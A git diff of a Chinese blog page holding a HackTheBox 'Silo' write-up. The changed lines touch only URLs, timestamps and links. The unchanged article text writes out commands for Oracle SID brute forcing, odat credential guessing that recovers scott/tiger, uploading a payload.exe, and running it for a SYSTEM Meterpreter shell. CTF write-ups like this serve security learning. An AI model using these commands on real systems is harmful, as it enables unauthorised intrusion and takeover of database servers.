@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
-  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -19,7 +19,7 @@
     <meta name="description" content="在我启动机器之后，我获取到了一个IP地址，我决定使用Nmap帮我对其进行端口服务枚举： 1nmap -sC -sV -p- -Pn -T4 10.10.10.82  网络延迟太大，花了我不少的功夫： 123456789101112131415161718192021222324252627282930313233343536373839404142434445Starting Nmap 7.92">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HackTheBox-Silo-Oracle测试">
-<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Silo/index.html">
+<meta property="og:url" content="https://crazyinside.github.io/2022/10/06/HackTheBox-Silo/index.html">
 <meta property="og:site_name" content="Personal Cloud Note">
 <meta property="og:description" content="在我启动机器之后，我获取到了一个IP地址，我决定使用Nmap帮我对其进行端口服务枚举： 1nmap -sC -sV -p- -Pn -T4 10.10.10.82  网络延迟太大，花了我不少的功夫： 123456789101112131415161718192021222324252627282930313233343536373839404142434445Starting Nmap 7.92">
 <meta property="og:locale" content="en_US">
@@ -37,7 +37,7 @@
 <meta property="og:image" content="https://www.worldisend.com/img/image-20220404212119419.png">
 <meta property="og:image" content="https://www.worldisend.com/img/image-20220404212230571.png">
 <meta property="og:image" content="https://www.worldisend.com/img/image-20220404212404798.png">
-<meta property="article:published_time" content="2022-10-06T11:30:34.873Z">
+<meta property="article:published_time" content="2022-10-06T13:49:08.205Z">
 <meta property="article:modified_time" content="2022-07-09T08:08:36.000Z">
 <meta property="article:author" content="Crazyinside">
 <meta property="article:tag" content="Windows">
@@ -84,7 +84,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -205,7 +205,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
@@ -222,7 +222,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-10-06 19:30" pubdate>
+        <time datetime="2022-10-06 21:49" pubdate>
           October 6, 2022 pm
         </time>
       </span>
@@ -296,35 +296,35 @@
 
 <p>Nmap帮我枚举到了这些信息：80端口为HTTP，135、49152、49153、49154、49155、49158、49161 和 49162、运行 Microsoft Windows RPC、139与445为Samba、端口1521和49160为 Oracle服务与TNS监听器。5985与47001运行Microsoft HTTPAPI httpd 2.0，目标操作系统为Windows Server 2008 R2 - 2012。</p>
 <p>首先我决定对80端口进行访问，我先尝试用Searchspolit搜寻IIS8.5公开漏洞，但并未搜到什么。为了不错过一些信息，在正式访问80端口这之前，我根据目标机器的名字，得知它的web站点域名为silo.htb，我需要将其添加到我的/etc/hosts文件中，然后再对80端口进行访问，我得到了如下一个页面：</p>
-<img src="https://www.worldisend.com/img/image-20220404163200257.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220404163200257" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220404163200257.png" srcset="/img/loading.gif" lazyload alt="image-20220404163200257" style="zoom:200%;" />
 
 <p>该页面看起来像是为我提供了大量的点击按钮，在我点击后它会将我引导向微软IIS官方，但是在我检查页面元素时，发现那些按钮只是个障眼法，它们都不是真实存在的，只是刚好都在一张图片中，而该图片引入了微软IIS官方做了一个超链接：</p>
-<img src="https://www.worldisend.com/img/image-20220404163558763.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220404163558763" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220404163558763.png" srcset="/img/loading.gif" lazyload alt="image-20220404163558763" style="zoom:200%;" />
 
 <p>我发现了目标的服务组件及脚本语言环境，虽然Nmap已经帮我枚举到了：</p>
-<img src="https://www.worldisend.com/img/image-20220404164151845.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220404164151845" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220404164151845.png" srcset="/img/loading.gif" lazyload alt="image-20220404164151845" style="zoom:200%;" />
 
 <p>我尝试对目标机器进行路径爆破：</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirsearch -u http:<span class="hljs-regexp">//</span>silo.htb/<br></code></pre></td></tr></table></figure>
 
-<img src="https://www.worldisend.com/img/image-20220404165113444.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220404165113444" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220404165113444.png" srcset="/img/loading.gif" lazyload alt="image-20220404165113444" style="zoom:200%;" />
 
 <p>我得到了一个目录，但它禁止了我访问：</p>
-<img src="https://www.worldisend.com/img/image-20220404165132364.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220404165132364" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220404165132364.png" srcset="/img/loading.gif" lazyload alt="image-20220404165132364" style="zoom:200%;" />
 
 <p>我尝试伪造来源对其进行绕过，但是我失败了，一旦我对数据包中的字段进行添加或删除，服务器都不会回包给我。</p>
 <p>80端口我不知道还能如何进展，于是我将目光放到了445端口，首先我尝试使用smbclient对其进行连接，但它要求我输入用户名与密码：</p>
-<img src="https://www.worldisend.com/img/image-20220404173738638.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220404173738638" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220404173738638.png" srcset="/img/loading.gif" lazyload alt="image-20220404173738638" style="zoom:200%;" />
 
 <p>我尝试了一些通用口令都失败了，于是我不得不先放弃去转向1521端口，它看起来像是运行着oracle数据库服务，Oracle数据库的攻击流程我了解的不多，但是我通过查询文档资料发现Oracle数据库在创建每个数据库时都会对该数据库附加一个SID，与windows创建用户产生的SID一样，幸运的是SID是可以进行枚举的，Metasploit有内置的枚举模块：</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/admin/</span>oracle/sid_brute<br></code></pre></td></tr></table></figure>
 
-<img src="https://www.worldisend.com/img/image-20220404183330672.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220404183330672" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220404183330672.png" srcset="/img/loading.gif" lazyload alt="image-20220404183330672" style="zoom:200%;" />
 
 <p>它为我枚举出了三个SID：XE、PLSExtProc、CLRExtProc，紧接着我可以通过Metasploit对其进行登录暴力破解，SID便是用在此处的，看来我完全可以把SID当成Oracle的数据库名：</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/admin/</span>oracle/oracle_login<br></code></pre></td></tr></table></figure>
 
-<img src="https://www.worldisend.com/img/image-20220404183828268.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220404183828268" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220404183828268.png" srcset="/img/loading.gif" lazyload alt="image-20220404183828268" style="zoom:200%;" />
 
 <p>因为Metasploit中的oracle_login需要安装oracle依赖支持，但是我尝试去Oracle官方下载对应的包，它的下载链接出了问题，我无法下载。Metasploit的Oracle_login我无法使用，于是我又通过搜索引擎找到了这样一款工具：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/quentinhardy/odat%EF%BC%8C%E5%AE%83%E6%98%AF%E4%B8%80%E6%AC%BE%E7%94%A8%E6%9D%A5%E6%8C%87%E5%AE%9A%E6%B5%8B%E8%AF%95Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%B7%A5%E5%85%B7%E3%80%82%E6%88%91%E5%8F%AF%E4%BB%A5%E5%9C%A8Kalinux%E8%BF%90%E8%A1%8C%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E5%AE%89%E8%A3%85%EF%BC%9A">https://github.com/quentinhardy/odat，它是一款用来指定测试Oracle数据库的工具。我可以在Kalinux运行如下命令进行安装：</a></p>
@@ -333,7 +333,7 @@
 <p>它一样可以为我枚举SID，但是Metasploit已经帮我做了，我不需再枚举一次，odat中的passwordguesser是obat工具中用来枚举登录凭证的模块，而字典口令则是odat自带的，因为我不知道其默认字典是什么，所以我根据help教程给定了其字典的绝对路径，我执行了这样一条命令用于oracle登录口令爆破：</p>
 <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">odat passwordguesser -s <span class="hljs-number">10.10</span>.<span class="hljs-number">10.82</span> -p <span class="hljs-number">1521</span> -d XE --accounts-<span class="hljs-keyword">file</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/odat/</span>accounts/accounts_small.txt<br></code></pre></td></tr></table></figure>
 
-<img src="https://www.worldisend.com/img/image-20220404204057267.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220404204057267" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220404204057267.png" srcset="/img/loading.gif" lazyload alt="image-20220404204057267" style="zoom:200%;" />
 
 <p>可能因为网络问题，它需要爆破很久很久，它为我枚举出了scott/tiger，但还有百分之42%未枚举，当然我可以切换SID参数对我通过Metasploit枚举到的其他SID也进行枚举，但是它实在是太慢了，我准备先暂时放下枚举它的念头，直到我需要获取一个更高权限的用户或是我找不到其他路的情况下再回过头来继续进行枚举。</p>
 <p>既然有了登录凭证，那自然可以通过Oracle数据库链接工具例如<strong>sqlplus</strong>去链接目标Oracle数据库，但是我并不想这么做，因为我知晓了一些其他方法，Odat简直是个非常棒的工具，我觉得我有必要在今后花费几天时间去学习它，因为以下命令可以直接帮助我进行RCE，写入或下载文件：</p>
@@ -345,22 +345,22 @@
 <p>然后通过如下命令将payload.exe写入目标指定目录：</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">odat utlfile -s 10.10.16.2 -p 1521 -d XE -U scott -P tiger <span class="hljs-params">--sysdba</span> <span class="hljs-params">--putFile</span> c:<span class="hljs-string">/windows/temp</span> payload.exe `<span class="hljs-keyword">pwd</span>`<span class="hljs-string">/payload.exe</span><br></code></pre></td></tr></table></figure>
 
-<img src="https://www.worldisend.com/img/image-20220404211726131.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220404211726131" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220404211726131.png" srcset="/img/loading.gif" lazyload alt="image-20220404211726131" style="zoom:200%;" />
 
 <p>它看起来写入成功了，紧接着，我需要使用odat为我提供的externaltable模块对payload.exe进行加载：</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">odat externaltable -s <span class="hljs-number">10.10</span>.<span class="hljs-number">10.82</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1521</span> -d XE -U scott -<span class="hljs-selector-tag">P</span> tiger <span class="hljs-attr">--sysdba</span> <span class="hljs-attr">--exec</span> c:/windows/temp payload.exe<br></code></pre></td></tr></table></figure>
 
 <p>它成功了，我获取到了Meterpreter会话：</p>
-<img src="https://www.worldisend.com/img/image-20220404212017461.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220404212017461" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220404212017461.png" srcset="/img/loading.gif" lazyload alt="image-20220404212017461" style="zoom:200%;" />
 
 <p>而且令人欣喜的是，我直接获取到了system权限级别的shell：</p>
-<img src="https://www.worldisend.com/img/image-20220404212119419.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220404212119419" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220404212119419.png" srcset="/img/loading.gif" lazyload alt="image-20220404212119419" style="zoom:200%;" />
 
 <p>我拿到了root.txt：</p>
-<img src="https://www.worldisend.com/img/image-20220404212230571.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220404212230571" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220404212230571.png" srcset="/img/loading.gif" lazyload alt="image-20220404212230571" style="zoom:200%;" />
 
 <p>我也拿到了user.txt：</p>
-<img src="https://www.worldisend.com/img/image-20220404212404798.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220404212404798" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220404212404798.png" srcset="/img/loading.gif" lazyload alt="image-20220404212404798" style="zoom:200%;" />
 
 <p>我看到之前Nmap帮我枚举到的其余信息，端口5985与47001运行Microsoft HTTPAPI httpd 2.0，很抱歉，它没为我提供什么信息，我也便失去了兴致。</p>
 
@@ -409,7 +409,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>HackTheBox-Silo-Oracle测试</div>
-      <div>http://example.com/2022/10/06/HackTheBox-Silo/</div>
+      <div>https://crazyinside.github.io/2022/10/06/HackTheBox-Silo/</div>
     </div>
     <div class="license-meta">
       
@@ -463,8 +463,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/10/06/HackTheBox-Sizzle/" title="HackTheBox-Sizzle">
-                        <span class="hidden-mobile">HackTheBox-Sizzle</span>
+                      <a href="/2022/10/06/HackThebox-Paper/" title="HackTheBox-Paper">
+                        <span class="hidden-mobile">HackTheBox-Paper</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
